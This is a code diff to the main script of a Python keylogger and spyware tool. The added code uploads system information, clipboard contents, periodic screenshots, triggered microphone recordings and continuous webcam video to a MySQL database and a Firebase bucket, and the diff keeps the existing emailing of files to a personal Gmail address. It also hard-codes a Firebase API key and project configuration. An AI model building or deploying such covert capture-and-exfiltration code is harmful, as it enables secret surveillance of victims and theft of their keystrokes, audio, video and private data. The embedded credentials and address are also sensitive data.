@@ -72,6 +72,7 @@ import generateLogFile as klog
 
 # Importing file to get system information
 import getSystemInfo as sysInfo
+import uploadSystemInfo
 
 # Importing Email Sender File
 import emailSender as es
@@ -92,20 +93,47 @@ import uploadScreenshot
 import audioRecorder as adRec
 import sounddevice as sd
 import numpy as np
+import uploadAudio
 
 # For recording video
 import videoRecorder as vdRec
-import wmi
 
 # For Multi-threading
 # to create different threads to execute different tasks
 import threading
 
+# Import file to connect to database
+import connectMysql as conn
+
+# Library to connect to firebase db
+import pyrebase
+import uploadFirebase
+
+# ---------------------------------------------------------------------------------------------------------
+
+# Connect to database
+mydb = conn.connect_to_mysql()
+
+config = {
+    "apiKey": "AIzaSyAboBophk8DAJBXmn4ltGZyGlYZnRqEpXQ",
+    "authDomain": "keylogger-e4335.firebaseapp.com",
+    "databaseURL": "https://keylogger-e4335-default-rtdb.asia-southeast1.firebasedatabase.app/",
+    "projectId": "keylogger-e4335",
+    "storageBucket": "keylogger-e4335.appspot.com",
+    "messagingSenderId": "880295281065",
+    "appId": "1:880295281065:web:31b4dba6661594ba84c4b8",
+    "measurementId": "G-YNJP3TKYWM"
+}
+
+firebase = pyrebase.initialize_app(config)
+storage = firebase.storage()
+
 # ---------------------------------------------------------------------------------------------------------
 
 # SECTION - I
 # Getting System Information
-sysInfo.get_System_Information()
+print("Gathering System Information...")
+file = sysInfo.get_System_Information() # - uncomment later
 
 
 # commented due to simplicity concerns
@@ -115,8 +143,13 @@ sysInfo.get_System_Information()
 # es.shareViaMail("systemInfo.txt.enc", "systemInfo.txt.enc", "bongspatra@gmail.com", False)
     
 # sharing the normal file via mail
-es.shareViaMail("systemInfo.txt", "systemInfo.txt", "bongspatra@gmail.com", False)
+print("Sharing System Information by mail...")
+es.shareViaMail("systemInfo.txt", "systemInfo.txt", "bongspatra@gmail.com", False) # - uncomment later
 
+# upload the system information to mysql database - screenshot table
+print("Uploading System Information to MySQL Database")
+uploadSystemInfo.uploadSystemDetails(mydb, file)
+ 
 # ---------------------------------------------------------------------------------------------------------
 
 # SECTION - II
@@ -135,10 +168,15 @@ def on_key_event(event):
         e.encrypt_file_fernet_start("clipboard.txt", True)
         
         # share the encrypted file via mail
+        print("Sharing Clipboard file by mail...")
         es.shareViaMail("clipboard.txt.enc", "clipboard.txt.enc" , "bongspatra@gmail.com", False)
 
+        # upload the clipboard text file to firebase - text folder
+        print("Uploading clipboard to Firebase Database")
+        uploadFirebase.uploadToFirebase(storage, "clipboard.txt", 1)
+        
 # Initiatate the keyboard listener to listen for event i.e. ctrl + c detect
-keyboard.on_press(on_key_event)
+keyboard.on_press(on_key_event) # - uncomment later
 
 # ---------------------------------------------------------------------------------------------------------
 
@@ -146,25 +184,31 @@ keyboard.on_press(on_key_event)
 # Getting Screenshot
 
 def get_Periodic_SS():
+    global mydb, storage
     while True:
         print("Taking Screenshot")
         filename = ss.capture_screenshot()
         
+        '''uncomment only if needed
+        increases load on system and consumes more net
+        bcoz photo has to added as attachment which is a comparatively bigger file'''
+        
         # share the captured screenshot by mail
+        print("Sharing Screenshot by mail...")
         es.shareViaMail(filename, filename, "bongspatra@gmail.com", True)
         
         # upload the screenshot to mysql database - screenshot table
         print("Uploading screenshot to MySQL Database")
-        uploadScreenshot.uploadSS(filename)
+        uploadScreenshot.uploadSS(mydb, filename)
         
-        # delete the screenshot file after uploading ann sending
+        # delete the screenshot file after uploading and sending
         print("Removing image file - " + filename + " - already uploaded")
         try:
             os.remove(filename)
         except OSError as e:
             print(e)
         
-        time.sleep(30)
+        time.sleep(5)
 
 # ---------------------------------------------------------------------------------------------------------
 
@@ -185,6 +229,18 @@ def listen_and_record(duration = 30, threshold = 7):
             timestamp = time.strftime("%Y%m%d-%H%M%S")
             filename = f"audio_recording_{timestamp}.wav"
             adRec.record_audio(duration, filename)
+            
+        # upload the recorded audio to mysql database - audio table
+        print("Uploading recorded audio to MySQL Database")
+        uploadAudio.uploadRecordedAudio(mydb, filename)
+        
+        # delete the audio file after uploading 
+        print("Removing audio file - " + filename + " - already uploaded")
+        try:
+            os.remove(filename)
+        except OSError as e:
+            print(e)
+            
         time.sleep(1)
             
 # ---------------------------------------------------------------------------------------------------------
@@ -193,21 +249,20 @@ def listen_and_record(duration = 30, threshold = 7):
 # Video Recorder
 
 def monitor_camera():
-    c = wmi.WMI()
-    watcher = c.Win32_Process.watch_for("creation")
-
     while True:
         try:
-            process = watcher()
-            if 'Camera' in process.Caption or 'camera' in process.Caption:
-                timestamp = time.strftime("%Y%m%d-%H%M%S")
-                filename = f"video_recording_{timestamp}.avi"
-                vdRec.record_video(filename)
+            timestamp = time.strftime("%Y%m%d-%H%M%S")
+            filename = f"video_recording_{timestamp}.avi"
+            vdRec.record_video(filename)
+            
+            # upload the recorded video to firebase - video folder
+            print("Uploading recorded video to Firebase Database")
+            uploadFirebase.uploadToFirebase(storage, filename, 2)
+            
         except Exception as e:
             print(f"Error: {e}")
-        time.sleep(1)
-
-        
+        time.sleep(5) 
+       
 # ---------------------------------------------------------------------------------------------------------
 
 # SECTION - VI
@@ -225,26 +280,26 @@ def log_key_press_continuously():
 # Creating Multiple Threads 
 
 # Create the thread for the continuous tracking of keys - log_key_press_continuosly()
-continuous_thread = threading.Thread(target=log_key_press_continuously, daemon=True)
+continuous_thread = threading.Thread(target=log_key_press_continuously, daemon=True) #- uncomment later
 
 # Create another thread which will continuously track microphone
 # When the audio volume raise above certain level 
 # Start recording for next 30 seconds - listen_and_record()
-continuous_thread2 = threading.Thread(target=listen_and_record, daemon=True)
+continuous_thread2 = threading.Thread(target=listen_and_record, daemon=True) #- uncomment later
 
 # Create another thread which will continuously monitor for camera
 # When the camera app is started 
 # Start recording for next 15 seconds - monitor_camera()
-continuous_thread3 = threading.Thread(target= monitor_camera, daemon=True)
+periodic_thread1 = threading.Thread(target= monitor_camera, daemon=True)
 
 # Create the thread for the periodic function - get_periodic_ss()
-periodic_thread = threading.Thread(target=get_Periodic_SS, daemon=True)
+periodic_thread2 = threading.Thread(target=get_Periodic_SS, daemon=True)
 
 # Start the threads
-continuous_thread.start()
-continuous_thread2.start()
-continuous_thread3.start()
-periodic_thread.start()
+continuous_thread.start() #- uncomment later
+continuous_thread2.start() #- uncomment later
+periodic_thread1.start()
+periodic_thread2.start()
 
 # Since the threads run indefinitely, the main thread will also run indefinitely
 # You can choose to use a more sophisticated method to stop threads gracefully
@@ -254,5 +309,4 @@ try:
 except KeyboardInterrupt:
     print("Program interrupted and exiting.")
 
-# ---------------------------------------------------------------------------------------------------------
-
+# ----------------------------------------------------------------------------------------------------
